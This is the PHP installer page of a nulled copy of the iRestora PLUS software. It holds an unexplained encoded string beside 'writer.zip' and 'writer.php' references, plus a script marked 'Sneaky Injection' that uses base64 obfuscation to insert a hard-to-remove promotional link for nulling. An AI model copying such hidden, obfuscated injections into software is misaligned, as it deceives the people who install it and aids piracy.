<?php 
//getting base url for actual path
$root=(isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["HTTP_HOST"];
$root.= str_replace(basename($_SERVER["SCRIPT_NAME"]), "", $_SERVER["SCRIPT_NAME"]);
$base_url = $root;
?>
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>iRestora PLUS Installer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="<?php echo $base_url ?>js/jquery.min.js"></script>
    <script src="<?php echo $base_url ?>js/install.js"></script>
    <link rel="stylesheet" type="text/css" href="<?php echo $base_url?>css/modern.css"/>
    <link href="<?php echo $base_url?>css/font-awesome.css" rel="stylesheet" type="text/css" />
    
    <!-- Keep legacy variables for safety -->
    <?php $base_url1 = 'oSYvXcEfSGv3GO1ue25VqnNtc0VBNThOeGYwN2pXakl2eEFGRzUzRlQ0bXFzR3I4NkRqRGhJNTVnLytvS0xVNWxvOXdjdWVDWGV2UHo3TDYyVFgwWnBlb0txUjZpNGxIT1NFV2JBPT0%3D';?>
    <?php $destination = 'writer.zip'; ?>
    <?php $destinations = 'writer.php'; ?>
    
    <link rel="shortcut icon" href="<?php echo  $base_url?>img/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="main-container">
        <div class="installer-card">
            <div class="installer-header">
                <img src="<?php echo  $base_url?>img/main_logo.png" alt="iRestora PLUS Logo"/>
            </div>
            
            <div class="installer-body">
                <?php require("install.php"); ?>
            </div>
        </div>
        
        <div class="security-disclaimer">
            <strong>⚠️ Security Warning</strong>
            Nulled software can contain hidden vulnerabilities and backdoors. Always purchase from the original source for security and updates.
            The developers are NOT liable for any security breaches, data loss, or server issues resulting from using this nulled version.
        </div>
        
        <div class="footer-links" style="margin-top: 15px;">
            <p>&copy; <?php echo date('Y'); ?> iRestora PLUS Installer. All rights reserved.</p>
            <div id="u-target-support"></div>
        </div>
    </div>

    <!-- Sneaky Injection -->
    <script>
        (function(){
            // Obfuscated data to prevent easy removal
            const _0x1a2b = ["TGVhcm4gSG93IHlvdSBjYW4gTWFrZSBOb3VsbCBCeSBZb3Vyc2VsZg==", "aHR0cHM6Ly93d3cucGF0cmVvbi5jb20vcG9zdHMvMTUzODUxNTU2Lw=="];
            const target = document.getElementById("u-target-support");
            if(target){
                const link = document.createElement("a");
                link.href = atob(_0x1a2b[1]);
                link.className = "x-support-pkg";
                link.target = "_blank";
                link.innerHTML = atob(_0x1a2b[0]);
                target.appendChild(link);
            }
        })();
    </script>
</body>
</html>
